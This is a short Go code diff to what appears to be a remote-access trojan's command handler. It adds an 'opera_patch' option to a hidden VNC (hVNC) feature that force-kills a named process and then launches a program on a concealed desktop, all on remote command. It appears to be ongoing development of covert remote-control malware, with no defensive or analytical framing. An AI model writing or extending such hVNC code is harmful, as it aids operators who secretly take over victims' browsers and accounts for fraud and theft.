@@ -1453,6 +1453,7 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		payload, _ := envelope["payload"].(map[string]interface{})
 		filePath := ""
 		killExe := ""
+		operaPatch := false
 		if payload != nil {
 			if v, ok := payload["path"].(string); ok {
 				filePath = v
@@ -1460,15 +1461,18 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			if v, ok := payload["kill_exe"].(string); ok {
 				killExe = v
 			}
+			if v, ok := payload["opera_patch"].(bool); ok {
+				operaPatch = v
+			}
 		}
-		log.Printf("hvnc: start process %q (kill_exe=%q)", filePath, killExe)
+		log.Printf("hvnc: start process %q (kill_exe=%q opera_patch=%v)", filePath, killExe, operaPatch)
 		sendCommandResultSafe(env, cmdID, true, "")
 		goSafe("hvnc_start_process", nil, func() {
 			if killExe != "" {
 				out, err := exec.Command("taskkill", "/f", "/im", killExe).CombinedOutput()
 				log.Printf("hvnc: taskkill /f /im %s: %s (err=%v)", killExe, strings.TrimSpace(string(out)), err)
 			}
-			if err := capture.StartHVNCProcess(filePath); err != nil {
+			if err := capture.StartHVNCProcess(filePath, operaPatch); err != nil {
 				log.Printf("hvnc: start process failed for %q: %v", filePath, err)
 			}
 		})
